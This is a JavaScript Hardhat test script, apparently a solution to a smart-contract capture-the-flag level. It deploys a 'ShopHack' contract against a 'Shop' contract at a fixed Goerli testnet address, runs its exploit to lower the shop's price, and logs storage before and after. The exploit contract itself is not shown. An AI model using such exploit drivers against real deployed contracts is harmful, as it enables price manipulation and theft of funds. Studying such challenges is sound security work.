const { expect } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("Shop", function () {
	let shop, provider, first_account;
	let target_address = false;

	beforeEach(async function () {
		target_address = "0x49f32DB27032B3a3590f9EB1688BA5273afCAb12";
		[first_account] = await ethers.getSigners();
		if (target_address) {
			shop = await ethers.getContractAt("Shop", target_address);
			provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
		} else {
			const Shop = await ethers.getContractFactory("Shop");
			shop = await Shop.deploy();
			target_address = shop.address;
			provider = new ethers.providers.getDefaultProvider("http:/\/localhost:8545");
		}
		console.log("Contract address: ", target_address);
	});

	it("Exploit", async function () {
        var data;
        console.log("Logging storage on the contract");
        for (let i = 0; i < 2; i++) {
            data = await provider.getStorageAt(target_address, i);
            console.log(i, data);
        }

        console.log("Deploying hack");
		// const ShopHack = await ethers.getContractFactory("ShopHack");
        // let hack = await ShopHack.deploy(shop.address);
        const ShopHack = await ethers.getContractFactory("ShopHack");
        let hack = await ShopHack.deploy(shop.address);

        // get previous price
        const original_price = await shop.price();
        console.log("Status before exploit:", original_price);

        // exploit
        console.log("Exploit");
        let tx = await hack.exploit();
        await tx.wait();
        console.log("Exploit finished");

        // successfull exploit?
        const new_price = await shop.price();
        console.log("Status after exploit:", new_price);
        expect(new_price < original_price).to.be.true;
		console.log("Logging after hack storage on the contract");
		for (let i = 0; i < 2; i++) {
            data = await provider.getStorageAt(target_address, i);
            console.log(i, data);
        }
	});

	afterEach(async function() {
		// COMPLETAR
	});
});
